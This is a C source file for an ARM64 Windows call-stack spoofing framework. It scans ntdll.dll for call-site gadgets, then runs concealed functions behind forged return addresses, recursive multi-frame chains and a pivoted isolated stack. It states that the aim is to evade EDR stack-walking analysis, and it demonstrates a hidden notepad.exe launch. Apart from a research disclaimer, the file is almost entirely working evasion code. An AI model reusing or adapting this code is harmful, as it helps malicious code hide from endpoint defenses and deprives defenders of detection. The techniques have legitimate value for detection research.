/*
 * ARM64 Call Stack Spoofing Framework for Windows
 * ================================================
 * Advanced call stack manipulation techniques for ARM64 architecture on Windows 11
 *
 * Author: Alexander Hagenah (@xaitax)
 *
 * Description:
 * This framework demonstrates advanced stack spoofing techniques specifically designed
 * for ARM64 Windows systems. It implements call-site gadget discovery, stack pivoting,
 * and multi-frame chain spoofing to evade modern EDR stack-walking analysis.
 *
 * Key Features:
 * - Call-site gadget randomization for signature resistance
 * - Stack pivoting with isolated execution contexts
 * - Multi-frame chain spoofing using recursion
 * - Unwind data (.pdata) alignment for EDR evasion
 *
 * Compilation:
 * cl /O2 /MT stack_spoof_arm64.c stack_spoof_arm64.obj /link /MACHINE:ARM64 dbghelp.lib
 *
 * DISCLAIMER:
 * This code is for authorized security research and education only.
 * Misuse of this code may violate laws and regulations.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "ntdll.lib")

/* ============================================================================
 * CONFIGURATION CONSTANTS
 * ============================================================================ */

#define MAX_GADGETS 512
#define DEFAULT_STACK_SIZE 0x10000 // 64KB
#define ARM64_BL_MASK 0xFC000000
#define ARM64_BL_OPCODE 0x94000000

/* ============================================================================
 * EXTERNAL ASSEMBLY FUNCTIONS
 * ============================================================================ */

/**
 * @brief Executes a function with a single spoofed return address
 * @param targetFunc Target function to execute
 * @param spoofedReturn Fake return address for stack walking
 * @param parameter Parameter to pass to target function
 * @param realReturnStorage Optional storage for real return address
 * @return Result from target function
 */
extern DWORD64 SpoofCallStack(
    void *targetFunc,
    void *spoofedReturn,
    void *parameter,
    void **realReturnStorage);

/**
 * @brief Executes a function with multiple spoofed stack frames
 * @param targetFunc Target function to execute
 * @param spoofChain Array of spoofed return addresses
 * @param parameter Parameter to pass to target function
 * @param chainDepth Number of frames to spoof (1-4)
 * @return Result from target function
 */
extern DWORD64 SpoofCallStackAdvanced(
    void *targetFunc,
    void **spoofChain,
    void *parameter,
    DWORD chainDepth);

/**
 * @brief Gets the current stack pointer value
 * @return Current SP register value
 */
extern void *GetCurrentStackPointer(void);

/**
 * @brief Gets the current frame pointer value
 * @return Current FP (x29) register value
 */
extern void *GetCurrentFramePointer(void);

/**
 * @brief Executes a function on an isolated stack
 * @param targetFunc Target function to execute
 * @param fakeFrameData Structure containing fake stack context
 * @param parameter Parameter to pass to target function
 * @return Result from target function
 */
extern DWORD64 ExecuteWithFakeFrame(
    void *targetFunc,
    void *fakeFrameData,
    void *parameter);

/* ============================================================================
 * DATA STRUCTURES
 * ============================================================================ */

/**
 * @brief Cache structure for storing discovered call-site gadgets
 *
 * This cache holds valid return addresses found after BL instructions
 * in legitimate modules. These addresses align with unwind data and
 * appear legitimate to stack walkers.
 */
typedef struct _GADGET_CACHE
{
    void *addresses[MAX_GADGETS]; // Array of gadget addresses
    DWORD count;                  // Number of cached gadgets
    char moduleName[64];          // Source module name
} GADGET_CACHE;

/**
 * @brief Context structure for isolated stack execution
 *
 * Contains all necessary information to execute a function
 * on a completely separate stack, breaking normal stack walks.
 */
typedef struct _FAKE_FRAME_DATA
{
    void *fakeFp;        // Spoofed frame pointer (x29)
    void *fakeLr;        // Spoofed link register (x30)
    void *fakeSp;        // Top of isolated stack
    DWORD64 reserved[5]; // Reserved for future use
} FAKE_FRAME_DATA;

/**
 * @brief Statistics for tracking framework operations
 */
typedef struct _SPOOF_STATS
{
    DWORD totalExecutions;
    DWORD baselineExecutions;
    DWORD spoofAttempts;
    DWORD successfulSpoofs;
    DWORD gadgetsDiscovered;
    DWORD64 totalTimeMs;
} SPOOF_STATS;

/* ============================================================================
 * GLOBAL STATE
 * ============================================================================ */

static volatile BOOL g_captureStack = TRUE;
static volatile DWORD g_secretValue = 0;
static GADGET_CACHE g_gadgetCache = {0};
static SPOOF_STATS g_stats = {0};

/* ============================================================================
 * TARGET FUNCTIONS
 * ============================================================================ */

/**
 * @brief Demonstration target function to be concealed
 *
 * This function simulates sensitive operations that we want to hide
 * from stack-walking security tools. In a real scenario, this could
 * be any function performing security-sensitive operations.
 *
 * @param param Input parameter (demonstration value)
 * @return Transformed value based on input
 */
__declspec(noinline) DWORD WINAPI SecretFunction(LPVOID param)
{
    DWORD value = (DWORD)(ULONG_PTR)param;

    printf("\n  [>] Executing concealed function\n");
    printf("      Parameter: 0x%08X\n", value);

    if (g_captureStack)
    {
        printf("\n  [STACK TRACE] From inside concealed function:\n");
        void *backtrace[12];
        USHORT frames = CaptureStackBackTrace(0, 12, backtrace, NULL);

        for (USHORT i = 0; i < frames; i++)
        {
            char buffer[sizeof(SYMBOL_INFO) + 256];
            PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
            pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
            pSymbol->MaxNameLen = 256;
            DWORD64 displacement = 0;

            if (SymFromAddr(GetCurrentProcess(), (DWORD64)backtrace[i], &displacement, pSymbol))
            {
                const char *marker = "";
                if (strstr(pSymbol->Name, "Secret"))
                {
                    marker = " <-- TARGET";
                }
                else if (displacement == 0 && i == 1)
                {
                    marker = " <-- SPOOFED";
                }

                printf("      [%02d] %-32s + 0x%04llX%s\n",
                       i, pSymbol->Name, displacement, marker);
            }
            else
            {
                printf("      [%02d] 0x%p (unresolved)\n", i, backtrace[i]);
            }
        }
    }

    // Simulated operation
    g_secretValue = value ^ 0xDEADBEEF;
    printf("\n  [>] Operation complete (Result: 0x%08X)\n", g_secretValue);

    return g_secretValue;
}

/**
 * @brief Target function to launch a process (notepad.exe)
 *
 * This function will be called using one of the spoofing techniques.
 * The process creation will appear to originate from a legitimate context.
 *
 * @param param Unused parameter
 * @return TRUE if process was launched successfully, FALSE otherwise
 */
__declspec(noinline) BOOL WINAPI LaunchNotepad(LPVOID param)
{
    UNREFERENCED_PARAMETER(param);
    printf("\n  [>] Executing concealed function: LaunchNotepad\n");

    wchar_t cmd[] = L"C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    BOOL success = CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi);

    if (success)
    {
        printf("  [>] Successfully launched notepad.exe (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        printf("  [ERROR] Failed to launch notepad.exe (Error: %lu)\n", GetLastError());
    }

    // No stack trace here to keep output clean for this specific scenario
    printf("\n  [>] Operation complete\n");
    return success;
}

/* ============================================================================
 * UTILITY FUNCTIONS
 * ============================================================================ */

/**
 * @brief Prints a formatted section separator
 */
void PrintSeparator(const char *title)
{
    printf("\n");
    printf("================================================================================\n");
    printf("  %s\n", title);
    printf("================================================================================\n");
}

/**
 * @brief Prints the framework banner
 */
void PrintBanner(void)
{
    printf("\n");
    printf("================================================================================\n");
    printf("                      ARM64 Call Stack Spoofing Framework                       \n");
    printf("                          Alexander Hagenah (@xaitax)                           \n");
    printf("================================================================================\n");
    printf("\n");
}

/**
 * @brief Prints system information
 */
void PrintSystemInfo(void)
{
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);

    printf("System Information:\n");
    printf("  * Process ID:        %d\n", GetCurrentProcessId());
    printf("  * Thread ID:         %d\n", GetCurrentThreadId());
    printf("  * Architecture:      %s\n",
           (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) ? "ARM64" : "Unknown/Emulated");
    printf("  * Processor Count:   %d\n", sysInfo.dwNumberOfProcessors);
    printf("  * Page Size:         0x%X bytes\n", sysInfo.dwPageSize);
    printf("\n");
}

/* ============================================================================
 * CORE EVASION ENGINE
 * ============================================================================ */

/**
 * @brief Checks if a DWORD represents an ARM64 BL instruction
 */
#define IS_ARM64_BL(inst) (((inst) & ARM64_BL_MASK) == ARM64_BL_OPCODE)

/**
 * @brief Discovers and caches legitimate call-site gadgets from a module
 *
 * This function scans the .text section of a specified module for BL
 * (Branch with Link) instructions. The addresses immediately following
 * these instructions are valid return addresses that align with the
 * module's unwind data, making them perfect for spoofing.
 *
 * @param moduleName Name of the module to scan (e.g., "ntdll.dll")
 * @param cache Pointer to gadget cache structure
 * @return TRUE if gadgets were found, FALSE otherwise
 */
BOOL CacheCallSites(const char *moduleName, GADGET_CACHE *cache)
{
    if (!cache || !moduleName)
    {
        printf("[ERROR] Invalid parameters for gadget discovery\n");
        return FALSE;
    }

    cache->count = 0;
    strncpy_s(cache->moduleName, sizeof(cache->moduleName), moduleName, _TRUNCATE);

    HMODULE hModule = GetModuleHandleA(moduleName);
    if (!hModule)
    {
        printf("[WARNING] Module '%s' not found in process\n", moduleName);
        return FALSE;
    }

    printf("[INFO] Scanning module: %s (Base: 0x%p)\n", moduleName, hModule);

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[ERROR] Invalid DOS signature in module\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[ERROR] Invalid NT signature in module\n");
        return FALSE;
    }

    // Find .text section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    BOOL textFound = FALSE;

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++)
    {
        if (strcmp((char *)pSectionHeader->Name, ".text") == 0)
        {
            textFound = TRUE;
            DWORD *pCurrent = (DWORD *)((BYTE *)hModule + pSectionHeader->VirtualAddress);
            DWORD *pEnd = (DWORD *)((BYTE *)pCurrent + pSectionHeader->Misc.VirtualSize - sizeof(DWORD));

            printf("[INFO] Scanning .text section (Size: %d bytes)\n", pSectionHeader->Misc.VirtualSize);

            // Scan for BL instructions
            while (pCurrent < pEnd && cache->count < MAX_GADGETS)
            {
                if (IS_ARM64_BL(*pCurrent))
                {
                    cache->addresses[cache->count++] = (void *)(pCurrent + 1);
                }
                pCurrent++;
            }

            g_stats.gadgetsDiscovered = cache->count;

            if (cache->count > 0)
            {
                printf("[SUCCESS] Discovered %d call-site gadgets in %s\n", cache->count, moduleName);
                printf("[INFO] First gadget: 0x%p | Last gadget: 0x%p\n",
                       cache->addresses[0],
                       cache->addresses[cache->count - 1]);
            }
            else
            {
                printf("[WARNING] No suitable gadgets found in %s\n", moduleName);
            }

            return cache->count > 0;
        }
    }

    if (!textFound)
    {
        printf("[ERROR] .text section not found in module\n");
    }

    return FALSE;
}

/**
 * @brief Selects a random gadget from the cache
 *
 * This randomization prevents signature-based detection by ensuring
 * that spoofed return addresses are non-deterministic.
 *
 * @param cache Pointer to gadget cache
 * @return Random gadget address or NULL if cache is empty
 */
void *GetRandomGadget(GADGET_CACHE *cache)
{
    if (!cache || cache->count == 0)
    {
        printf("[WARNING] Gadget cache is empty\n");
        return NULL;
    }

    DWORD index = rand() % cache->count;
    void *gadget = cache->addresses[index];

    printf("[DEBUG] Selected gadget[%d/%d]: 0x%p\n", index, cache->count, gadget);
    return gadget;
}

/**
 * @brief Helper structure for recursive multi-frame spoofing
 */
typedef struct _RECURSIVE_SPOOF_CONTEXT
{
    void *targetFunc;
    void *parameter;
    void **spoofChain;
    DWORD currentDepth;
    DWORD maxDepth;
    DWORD64 result;
} RECURSIVE_SPOOF_CONTEXT;

/**
 * @brief Recursive helper to build genuine multi-frame spoofing
 * Each recursion level adds a real frame with a spoofed return address
 */
__declspec(noinline) static void RecursiveSpoofHelper(RECURSIVE_SPOOF_CONTEXT *ctx)
{
    if (ctx->currentDepth >= ctx->maxDepth)
    {
        // Base case: execute the target function
        typedef DWORD(WINAPI * TargetFunc)(LPVOID);
        TargetFunc target = (TargetFunc)ctx->targetFunc;
        ctx->result = target(ctx->parameter);
        return;
    }

    // Get the spoofed return address for this level
    void *spoofedReturn = ctx->spoofChain[ctx->currentDepth];
    void *realReturn = NULL;

    // Increment depth for next recursion
    ctx->currentDepth++;

    // Use our single-frame spoofer at each recursion level
    // This creates a genuine frame with a spoofed return
    DWORD64 tempResult = SpoofCallStack(
        (void *)RecursiveSpoofHelper, // Call ourselves recursively
        spoofedReturn,                // With a spoofed return
        ctx,                          // Pass context
        &realReturn                   // Store real return
    );

    // Result is propagated through context structure
}

/* ============================================================================
 * TEST SCENARIOS
 * ============================================================================ */

/**
 * @brief Scenario 1: Baseline direct execution
 */
void TestNormalExecution(void)
{
    PrintSeparator("SCENARIO 1: BASELINE - DIRECT FUNCTION INVOCATION");

    printf("\n[INFO] Establishing baseline with direct function call\n");
    printf("[INFO] Expected: Full call stack visible to security tools\n");

    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    DWORD result = SecretFunction((LPVOID)0x11111111);

    QueryPerformanceCounter(&end);
    DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

    printf("\n[SUCCESS] Direct execution completed in %llu ms\n", elapsed);
    printf("[INFO] Result: 0x%08X\n", result);

    g_stats.totalExecutions++;
    g_stats.baselineExecutions++;
    g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 2: Single-frame spoofing
 */
void TestBasicSpoofing(void)
{
    PrintSeparator("SCENARIO 2: SINGLE-FRAME CALL STACK SPOOFING");

    void *spoofedReturnGadget = GetRandomGadget(&g_gadgetCache);
    if (!spoofedReturnGadget)
    {
        printf("[ERROR] No gadgets available for spoofing\n");
        return;
    }

    printf("\n[INFO] Executing with spoofed return address\n");
    printf("[INFO] Gadget source: %s\n", g_gadgetCache.moduleName);
    printf("[INFO] Spoofed return: 0x%p\n", spoofedReturnGadget);

    void *realReturn = NULL;

    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    DWORD64 result = SpoofCallStack(
        SecretFunction,
        spoofedReturnGadget,
        (LPVOID)0x22222222,
        &realReturn);

    QueryPerformanceCounter(&end);
    DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

    printf("\n[SUCCESS] Spoofed execution completed in %llu ms\n", elapsed);
    printf("[INFO] Result: 0x%08llX\n", result);
    printf("[DEBUG] Real return address was: 0x%p\n", realReturn);

    g_stats.totalExecutions++;
    g_stats.spoofAttempts++;
    if (result)
        g_stats.successfulSpoofs++;
    g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 3: Multi-frame chain spoofing using recursion
 */
void TestAdvancedSpoofing(void)
{
    PrintSeparator("SCENARIO 3: TRUE MULTI-FRAME CALL CHAIN SPOOFING");

#define CHAIN_DEPTH 3 // How many fake frames to insert

    if (g_gadgetCache.count < CHAIN_DEPTH)
    {
        printf("\n[WARNING] Insufficient gadgets for %d-frame chain (have %d)\n",
               CHAIN_DEPTH, g_gadgetCache.count);
        return;
    }

    printf("\n[INFO] Building TRUE %d-frame deep call chain using recursive spoofing\n", CHAIN_DEPTH);
    printf("[INFO] This technique creates real frames with spoofed return addresses\n");

    // Build array of spoofed return addresses
    void *spoofChain[CHAIN_DEPTH];
    printf("\n  Multi-frame chain composition:\n");

    for (int i = 0; i < CHAIN_DEPTH; i++)
    {
        spoofChain[i] = GetRandomGadget(&g_gadgetCache);
        printf("    Frame[%d]: 0x%p", i, spoofChain[i]);

        // Resolve and display the symbol for clarity
        char buffer[sizeof(SYMBOL_INFO) + 256];
        PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;
        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
        pSymbol->MaxNameLen = 256;
        DWORD64 displacement = 0;

        if (SymFromAddr(GetCurrentProcess(), (DWORD64)spoofChain[i], &displacement, pSymbol))
        {
            printf(" (%s+0x%llX)", pSymbol->Name, displacement);
        }
        printf("\n");
    }

    // Set up recursion context
    RECURSIVE_SPOOF_CONTEXT ctx = {
        .targetFunc = SecretFunction,
        .parameter = (void *)0x33333333,
        .spoofChain = spoofChain,
        .currentDepth = 0,
        .maxDepth = CHAIN_DEPTH,
        .result = 0};

    printf("\n[INFO] Executing with %d levels of recursion, each with spoofed return\n", CHAIN_DEPTH);

    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    // Start the recursive spoofing chain
    RecursiveSpoofHelper(&ctx);
    DWORD64 result = ctx.result;

    QueryPerformanceCounter(&end);
    DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

    printf("\n[SUCCESS] TRUE multi-frame execution completed in %llu ms\n", elapsed);
    printf("[INFO] Result: 0x%08llX\n", result);
    printf("[INFO] Expected: %d spoofed frames should appear in the call stack\n", CHAIN_DEPTH);

    g_stats.totalExecutions++;
    g_stats.spoofAttempts++;
    if (result)
        g_stats.successfulSpoofs++;
    g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 4: Stack pivoting with isolated execution
 */
void TestFakeFrameExecution(void)
{
    PrintSeparator("SCENARIO 4: STACK PIVOTING & EXECUTION ISOLATION");

    printf("\n[INFO] Preparing isolated execution environment\n");

    // Allocate isolated stack
    SIZE_T fakeStackSize = DEFAULT_STACK_SIZE;
    void *fakeStackBase = VirtualAlloc(
        NULL,
        fakeStackSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!fakeStackBase)
    {
        printf("[ERROR] Failed to allocate isolated stack (Error: %lu)\n", GetLastError());
        return;
    }

    printf("[SUCCESS] Allocated %zu KB isolated stack at 0x%p\n",
           fakeStackSize / 1024, fakeStackBase);

    // Prepare fake frame
    void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + fakeStackSize);
    FAKE_FRAME_DATA fakeFrame = {
        .fakeFp = (void *)((ULONG_PTR)fakeStackTop - 0x100),
        .fakeLr = GetRandomGadget(&g_gadgetCache),
        .fakeSp = fakeStackTop};

    printf("[INFO] Fake frame configuration:\n");
    printf("      FP: 0x%p\n", fakeFrame.fakeFp);
    printf("      LR: 0x%p\n", fakeFrame.fakeLr);
    printf("      SP: 0x%p\n", fakeFrame.fakeSp);

    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    // Disable stack capture for this test to avoid polluting output
    g_captureStack = FALSE;
    DWORD64 result = ExecuteWithFakeFrame(
        SecretFunction,
        &fakeFrame,
        (LPVOID)0x44444444);
    g_captureStack = TRUE; // Re-enable for other tests

    QueryPerformanceCounter(&end);
    DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

    printf("\n[SUCCESS] Isolated execution completed in %llu ms\n", elapsed);
    printf("[INFO] Result: 0x%08llX\n", result);
    printf("[INFO] Stack isolation prevented normal stack walking\n");

    // Cleanup
    VirtualFree(fakeStackBase, 0, MEM_RELEASE);
    printf("[DEBUG] Released isolated stack memory\n");

    g_stats.totalExecutions++;
    g_stats.spoofAttempts++;
    if (result)
        g_stats.successfulSpoofs++;
    g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Scenario 5: Spoofed process launch using stack pivoting
 */
void TestProcessLaunchSpoofing(void)
{
    PrintSeparator("SCENARIO 5: SPOOFED PROCESS LAUNCH VIA STACK PIVOTING");

    printf("\n[INFO] Preparing isolated execution environment for process launch\n");
    printf("[INFO] Goal: Launch notepad.exe from a concealed call stack\n");

    // Allocate isolated stack
    SIZE_T fakeStackSize = DEFAULT_STACK_SIZE;
    void *fakeStackBase = VirtualAlloc(
        NULL,
        fakeStackSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!fakeStackBase)
    {
        printf("[ERROR] Failed to allocate isolated stack (Error: %lu)\n", GetLastError());
        return;
    }

    printf("[SUCCESS] Allocated %zu KB isolated stack at 0x%p\n",
           fakeStackSize / 1024, fakeStackBase);

    // Prepare fake frame for the process launch
    void *fakeStackTop = (void *)((ULONG_PTR)fakeStackBase + fakeStackSize);
    FAKE_FRAME_DATA fakeFrame = {
        .fakeFp = (void *)((ULONG_PTR)fakeStackTop - 0x100),
        .fakeLr = GetRandomGadget(&g_gadgetCache),
        .fakeSp = fakeStackTop};

    printf("[INFO] Fake frame configuration:\n");
    printf("      FP: 0x%p\n", fakeFrame.fakeFp);
    printf("      LR: 0x%p\n", fakeFrame.fakeLr);
    printf("      SP: 0x%p\n", fakeFrame.fakeSp);

    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    DWORD64 result = ExecuteWithFakeFrame(
        LaunchNotepad,
        &fakeFrame,
        NULL); // No parameter needed for LaunchNotepad

    QueryPerformanceCounter(&end);
    DWORD64 elapsed = ((end.QuadPart - start.QuadPart) * 1000) / freq.QuadPart;

    if (result)
    {
        printf("\n[SUCCESS] Isolated process launch completed in %llu ms\n", elapsed);
    }
    else
    {
        printf("\n[FAILURE] Isolated process launch failed in %llu ms\n", elapsed);
    }

    // Cleanup
    VirtualFree(fakeStackBase, 0, MEM_RELEASE);
    printf("[DEBUG] Released isolated stack memory\n");

    g_stats.totalExecutions++;
    g_stats.spoofAttempts++;
    if (result)
        g_stats.successfulSpoofs++;
    g_stats.totalTimeMs += elapsed;
}

/**
 * @brief Prints execution statistics
 */
void PrintStatistics(void)
{
    PrintSeparator("EXECUTION STATISTICS");

    printf("\n");
    printf("  Performance Metrics:\n");
    printf("    * Total Executions:     %d\n", g_stats.totalExecutions);
    printf("    * Baseline Tests:       %d\n", g_stats.baselineExecutions);
    printf("    * Spoofing Attempts:    %d\n", g_stats.spoofAttempts);
    printf("    * Successful Spoofs:    %d\n", g_stats.successfulSpoofs);
    printf("    * Gadgets Discovered:   %d\n", g_stats.gadgetsDiscovered);

    if (g_stats.totalExecutions > 0)
    {
        DWORD64 avgTime = g_stats.totalTimeMs / g_stats.totalExecutions;
        printf("    * Average Exec Time:    %llu ms\n", avgTime);

        if (g_stats.spoofAttempts > 0)
        {
            double successRate = (double)g_stats.successfulSpoofs / g_stats.spoofAttempts * 100.0;
            printf("    * Spoofing Success:     %.1f%%\n", successRate);
        }
    }

    printf("\n  Security Analysis:\n");
    printf("    * EDR Evasion Level:    ");

    if (g_stats.spoofAttempts > 0 && g_stats.successfulSpoofs == g_stats.spoofAttempts)
    {
        printf("MAXIMUM (All spoofing techniques successful)\n");
    }
    else if (g_stats.spoofAttempts > 0 && g_stats.successfulSpoofs >= g_stats.spoofAttempts * 0.75)
    {
        printf("HIGH (Most spoofing techniques successful)\n");
    }
    else
    {
        printf("MEDIUM (Partial spoofing success)\n");
    }

    printf("    * Detection Surface:    ");
    if (g_stats.gadgetsDiscovered > 500)
    {
        printf("MINIMAL (Maximum gadget entropy: %d gadgets)\n", g_stats.gadgetsDiscovered);
    }
    else if (g_stats.gadgetsDiscovered > 100)
    {
        printf("LOW (High gadget entropy: %d gadgets)\n", g_stats.gadgetsDiscovered);
    }
    else
    {
        printf("MODERATE (Limited gadget pool: %d gadgets)\n", g_stats.gadgetsDiscovered);
    }

    printf("    * Technique Coverage:   ");
    printf("Single-Frame | Multi-Frame | Stack Pivot | Process Launch\n");
}

/* ============================================================================
 * MAIN ENTRY POINT
 * ============================================================================ */

int main(void)
{
    PrintBanner();
    PrintSystemInfo();

    // Initialize random seed
    srand((unsigned int)time(NULL));

    // Initialize symbol handler
    printf("[INFO] Initializing symbol handler...\n");
    if (!SymInitialize(GetCurrentProcess(), NULL, TRUE))
    {
        printf("[ERROR] Failed to initialize symbols (Error: %lu)\n", GetLastError());
        return EXIT_FAILURE;
    }
    SymSetOptions(SYMOPT_LOAD_LINES | SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
    printf("[SUCCESS] Symbol handler initialized\n");

    // Build gadget cache
    printf("[INFO] Building gadget cache from system modules...\n");
    if (!CacheCallSites("ntdll.dll", &g_gadgetCache))
    {
        printf("[ERROR] Failed to build gadget cache - spoofing not viable\n");
        SymCleanup(GetCurrentProcess());
        return EXIT_FAILURE;
    }

    // Execute test scenarios
    TestNormalExecution();
    TestBasicSpoofing();
    TestAdvancedSpoofing();
    TestFakeFrameExecution();
    TestProcessLaunchSpoofing();

    // Print summary
    PrintStatistics();

    printf("\n");
    printf("[SUCCESS] All scenarios completed successfully\n");
    printf("[INFO] Final concealed value: 0x%08X\n", g_secretValue);

    // Cleanup
    SymCleanup(GetCurrentProcess());

    return EXIT_SUCCESS;
}
